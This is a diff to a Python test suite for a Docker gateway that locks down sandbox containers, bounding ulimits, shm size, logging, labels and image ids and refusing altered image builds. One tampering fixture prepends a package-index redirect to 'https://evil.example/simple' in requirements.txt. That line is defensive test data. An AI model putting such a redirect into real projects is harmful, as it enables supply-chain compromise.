@@ -178,6 +178,7 @@ def test_the_sandbox_request_of_the_docker_cli_is_accepted_and_locked_down() -> 
         "SecurityOpt",
         "Privileged",
         "IpcMode",
+        "ShmSize",
         "Binds",
         "Mounts",
         "Devices",
@@ -205,6 +206,104 @@ def test_missing_isolation_flags_are_added_not_trusted() -> None:
     assert created["HostConfig"]["SecurityOpt"] == ["no-new-privileges"]
     assert created["HostConfig"]["Memory"] == CONFIG.max_memory_mb * 1024 * 1024
     assert created["HostConfig"]["PidsLimit"] == CONFIG.max_pids
+
+
+IMAGE_ID = "sha256:" + "ab" * 32
+#: What Orkexa's ``run_args`` (StreamedSandbox, docker 29) adds to the request: private IPC, /dev/shm, ulimits, no
+#: logging, its labels, nodev tmpfs; the image by its id.
+ORKEXA_CREATE = {
+    "Image": IMAGE_ID,
+    "Labels": {"org.orkexa.sandbox": "nodestro", "org.orkexa.deadline": "1798761600"},
+    "host": {
+        "IpcMode": "private",
+        "ShmSize": 16 * 1024 * 1024,
+        "LogConfig": {"Type": "none", "Config": {}},
+        "Ulimits": [
+            {"Name": "nofile", "Hard": 1024, "Soft": 1024},
+            {"Name": "fsize", "Hard": 16777216, "Soft": 16777216},
+            {"Name": "core", "Hard": 0, "Soft": 0},
+        ],
+        "Tmpfs": {"/tmp": "rw,noexec,nosuid,nodev,size=16m", "/work": "rw,noexec,nosuid,nodev,size=16m,mode=1777"},
+    },
+}
+
+
+def test_orkexa_s_container_shape_is_accepted_and_kept() -> None:
+    from nodestro_runtime.container_images import sandbox_run_args
+
+    run = sandbox_run_args("docker", "orkexa-sandbox-0123456789ab", IMAGE_ID, memory_mb=512, cpus=1.0, pids_limit=64)
+    # The request above is what the docker CLI makes of exactly these flags.
+    for flag in ("--ipc", "--shm-size", "--log-driver"):
+        assert flag in run
+    assert [run[i + 1] for i, item in enumerate(run) if item == "--tmpfs"] == [f"{k}:{v}" for k, v in TMPFS.items()]
+    request = copy.deepcopy(ORKEXA_CREATE)
+    _query, raw = plan_create({"name": "orkexa-sandbox-0123456789ab"}, body(**request), CONFIG)
+    created = json.loads(raw)
+    host = created["HostConfig"]
+    assert created["Image"] == IMAGE_ID
+    assert created["Labels"] == {**ORKEXA_CREATE["Labels"], LABEL: "test"}
+    assert host["IpcMode"] == "private" and host["ShmSize"] == 16 * 1024 * 1024
+    assert host["LogConfig"] == {"Type": "none", "Config": {}}
+    assert host["Ulimits"] == [
+        {"Name": "nofile", "Soft": 1024, "Hard": 1024},
+        {"Name": "fsize", "Soft": 16777216, "Hard": 16777216},
+        {"Name": "core", "Soft": 0, "Hard": 0},
+    ]
+    assert host["Tmpfs"] == TMPFS
+    # Orkexa's self-test container has a name of its own.
+    plan_create({"name": "orkexa-selftest-0123456789ab"}, body(**copy.deepcopy(ORKEXA_CREATE)), CONFIG)
+
+
+def test_the_gateway_s_defaults_fill_what_a_request_leaves_out() -> None:
+    _, raw = plan_create({}, body(), CONFIG)
+    host = json.loads(raw)["HostConfig"]
+    assert host["ShmSize"] == gw.DEFAULT_SHM
+    assert {item["Name"]: item["Soft"] for item in host["Ulimits"]} == {
+        "nofile": 1024,
+        "fsize": gw.DEFAULT_FSIZE,
+        "core": 0,
+    }
+
+
+def test_foreign_and_malformed_labels_are_dropped() -> None:
+    labels = {"org.orkexa.sandbox": "Bad Owner", "org.orkexa.deadline": "soon", "com.evil": "x", LABEL: "other"}
+    _, raw = plan_create({}, body(Labels=labels), CONFIG)
+    assert json.loads(raw)["Labels"] == {LABEL: "test"}
+
+
+@pytest.mark.parametrize("owner", ["nodestro-0123456789ab", "nodestro-mcp-0123456789ab", "nodestro"])
+def test_an_installation_s_own_owner_label_is_kept(owner: str) -> None:
+    labels = {"org.orkexa.sandbox": owner, "org.orkexa.deadline": "1798761600"}
+    _, raw = plan_create({}, body(Labels=labels), CONFIG)
+    assert json.loads(raw)["Labels"] == {**labels, LABEL: "test"}  # the gateway's own label is always its own
+
+
+@pytest.mark.parametrize(
+    ("host", "reason"),
+    [
+        ({"IpcMode": "shareable"}, "IpcMode"),
+        ({"ShmSize": 1024**3}, "dev/shm"),
+        ({"LogConfig": {"Type": "json-file", "Config": {}}}, "LogConfig"),
+        ({"LogConfig": {"Type": "none", "Config": {"max-size": "1g"}}}, "LogConfig"),
+        ({"Ulimits": [{"Name": "nofile", "Soft": 65536, "Hard": 65536}]}, "files"),
+        ({"Ulimits": [{"Name": "nofile", "Soft": 512, "Hard": 1024}]}, "equal"),
+        ({"Ulimits": [{"Name": "fsize", "Soft": 1024**3, "Hard": 1024**3}]}, "files of at most"),
+        ({"Ulimits": [{"Name": "core", "Soft": -1, "Hard": -1}]}, "equal"),
+        ({"Ulimits": [{"Name": "core", "Soft": 1, "Hard": 1}]}, "core"),
+        ({"Ulimits": [{"Name": "nproc", "Soft": 1, "Hard": 1}]}, "nproc"),
+        ({"Ulimits": [{"Name": "memlock", "Soft": 1, "Hard": 1}]}, "memlock"),
+        ({"Ulimits": "nofile=1"}, "list"),
+    ],
+)
+def test_orkexa_s_extra_settings_are_bounded(host: dict[str, Any], reason: str) -> None:
+    with pytest.raises(Refused, match=reason):
+        plan_create({}, body(host=host), CONFIG)
+
+
+@pytest.mark.parametrize("image", ["sha256:abc", "sha256:" + "AB" * 32, "sha512:" + "ab" * 64, "ab" * 32])
+def test_only_well_formed_image_ids_are_considered(image: str) -> None:
+    with pytest.raises(Refused, match="sandbox images"):
+        plan_create({}, body(Image=image), CONFIG)
 
 
 @pytest.mark.parametrize(
@@ -306,6 +405,9 @@ def test_the_endpoints_of_the_sandboxes_are_routed() -> None:
     assert gw.route("DELETE", "/v1.51/containers/nodestro-sandbox-x") == ("container:delete", "nodestro-sandbox-x")
     assert gw.route("GET", f"/v1.51/images/{IMAGE}/json") == ("image:inspect", IMAGE)
     assert gw.route("DELETE", f"/v1.51/images/{IMAGE}") == ("image:delete", IMAGE)
+    assert gw.route("GET", f"/v1.51/images/{IMAGE_ID}/json") == ("image:inspect", IMAGE_ID)
+    with pytest.raises(Refused):
+        gw.route("DELETE", f"/v1.51/images/sha256:{'ab' * 32}")  # removed only by tag
 
 
 # ---- image builds ----------------------------------------------------------------------------------------------
@@ -378,7 +480,7 @@ def test_a_build_is_refused_when_anything_differs() -> None:
         files["payload.sh"] = b"#!/bin/sh\n"
 
     def orkexa(files: dict[str, bytes]) -> None:
-        files["orkexa/__init__.py"] += b"\nimport os\n"
+        files["orkexa/tools.py"] += b"\nimport os\n"
 
     def index(files: dict[str, bytes]) -> None:
         files["requirements.txt"] = b"--index-url https://evil.example/simple\n" + files["requirements.txt"]
@@ -473,6 +575,8 @@ class FakeDaemon:
         self.security_options = ["name=seccomp,profile=builtin", "name=cgroupns"]
         #: What ``/images/json`` lists (the environment images on the daemon).
         self.images: list[dict[str, Any]] = []
+        #: What ``/images/<ref>/json`` answers per reference (404 for others).
+        self.inspected: dict[str, dict[str, Any]] = {}
 
     async def handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
         request = await gw.read_request(reader, limit=1 << 26)
@@ -504,6 +608,11 @@ class FakeDaemon:
             writer.write(data.upper())
             await writer.drain()
             writer.write_eof()
+        elif re.search(r"/images/[^/]+/json$", path):
+            found = self.inspected.get(unquote(path.rsplit("/", 2)[1]))
+            answer = json.dumps(found if found is not None else {"message": "No such image"}).encode()
+            status = b"200 OK" if found is not None else b"404 Not Found"
+            writer.write(b"HTTP/1.1 " + status + f"\r\nContent-Length: {len(answer)}\r\n\r\n".encode() + answer)
         elif path.endswith("/images/json"):
             answer = json.dumps(self.images).encode()
             writer.write(f"HTTP/1.1 200 OK\r\nContent-Length: {len(answer)}\r\n\r\n".encode() + answer)
@@ -668,6 +777,33 @@ async def test_a_created_container_is_locked_down_and_usable(gateway: tuple[Fake
     answer = await _send(listen, b"DELETE /v1.51/containers/nodestro-sandbox-aaaa?force=1 HTTP/1.1\r\nHost: d\r\n\r\n")
     assert answer.startswith(b"HTTP/1.1 204")
     assert daemon.requests[-1][1] == f"/v1.51/containers/{container_id}?force=1"
+
+
+async def test_an_image_id_runs_only_when_it_is_a_nodestro_image(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
+    daemon, listen, _ = gateway
+    request = body(**copy.deepcopy(ORKEXA_CREATE))
+    answer = await _send(listen, _post("/v1.51/containers/create?name=orkexa-sandbox-aaaa", request))
+    assert answer.startswith(b"HTTP/1.1 404") and b"not one of Nodestro's sandbox images" in answer
+    assert daemon.created == 0
+    lock = {"Labels": {gw.LOCK_LABEL: "0" * 64}}
+    for wrong in (
+        {"Id": IMAGE_ID, "RepoTags": ["python:3.13-slim"], "Config": lock},  # not an environment image
+        {"Id": IMAGE_ID, "RepoTags": [IMAGE], "Config": {"Labels": {}}},  # no lock label
+        {"Id": "sha256:" + "cd" * 32, "RepoTags": [IMAGE], "Config": lock},  # another image
+    ):
+        daemon.inspected[IMAGE_ID] = wrong
+        answer = await _send(listen, _post("/v1.51/containers/create?name=orkexa-sandbox-aaaa", request))
+        assert answer.startswith(b"HTTP/1.1 404"), wrong
+        answer = await _send(listen, f"GET /v1.51/images/{IMAGE_ID}/json HTTP/1.1\r\nHost: d\r\n\r\n".encode())
+        assert answer.startswith(b"HTTP/1.1 404"), wrong
+    assert daemon.created == 0
+    daemon.inspected[IMAGE_ID] = {"Id": IMAGE_ID, "RepoTags": [IMAGE], "Config": lock}
+    answer = await _send(listen, _post("/v1.51/containers/create?name=orkexa-sandbox-aaaa", request))
+    assert answer.startswith(b"HTTP/1.1 201") and daemon.created == 1
+    created = json.loads(daemon.requests[-1][2])
+    assert created["Image"] == IMAGE_ID and created["Labels"]["org.orkexa.sandbox"] == "nodestro"
+    answer = await _send(listen, f"GET /v1.51/images/{IMAGE_ID}/json HTTP/1.1\r\nHost: d\r\n\r\n".encode())
+    assert answer.startswith(b"HTTP/1.1 200")
 
 
 async def test_containers_the_gateway_did_not_create_cannot_be_used(gateway: tuple[FakeDaemon, str, Gateway]) -> None:
